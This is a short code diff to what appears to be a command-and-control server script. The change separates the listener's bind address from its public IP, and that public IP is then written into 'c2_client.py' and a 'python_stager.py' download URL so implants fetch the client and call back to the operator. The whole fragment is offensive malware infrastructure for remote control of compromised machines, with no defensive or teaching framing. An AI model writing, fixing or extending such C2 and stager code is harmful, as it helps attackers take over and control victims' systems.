@@ -21,7 +21,8 @@ def get_public_ip():
         logging.error(f"Error fetching public IP: {e}")
         return None
 
-HOST = get_public_ip() if config['server_host'] == '0.0.0.0' else config['server_host']
+LOCAL_HOST = "0.0.0.0"  # Bind to all available interfaces
+PUBLIC_HOST = get_public_ip() if config['server_host'] == '0.0.0.0' else config['server_host']
 PORT = config['server_port']
 LOG_FILE = config['log_file']
 PAYLOAD_FILENAME = config['payload_filename']
@@ -72,9 +73,9 @@ def handle_client(client_socket, addr):
 
 def start_listener():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((HOST, PORT))
+    server.bind((LOCAL_HOST, PORT))
     server.listen(5)
-    print(f"[*] Listening on {HOST}:{PORT}")
+    print(f"[*] Listening on {LOCAL_HOST}:{PORT}")
 
     while True:
         client_socket, addr = server.accept()
@@ -89,8 +90,8 @@ def update_client_file():
     ]
 
     search_replace_pairs = {
-        'c2_client.py': ("SERVER_HOST = '1.1.1.1'", f"SERVER_HOST = '{HOST}'"),
-        'python_stager.py': ("http://1.1.1.1/c2_client.py", f"http://{HOST}/c2_client.py")
+        'c2_client.py': ("SERVER_HOST = '1.1.1.1'", f"SERVER_HOST = '{PUBLIC_HOST}'"),
+        'python_stager.py': ("http://1.1.1.1/c2_client.py", f"http://{PUBLIC_HOST}/c2_client.py")
     }
     
     for file_path in files_to_update:
@@ -129,7 +130,7 @@ def update_client_file():
             print(f"[!] Error writing to file {file_path}: {e}")
             continue
 
-        print(f"[*] Updated {file_path} with server IP: {HOST}")
+        print(f"[*] Updated {file_path} with server IP: {PUBLIC_HOST}")
 
 def start_http_server():
     update_client_file()  # Update the client file before serving
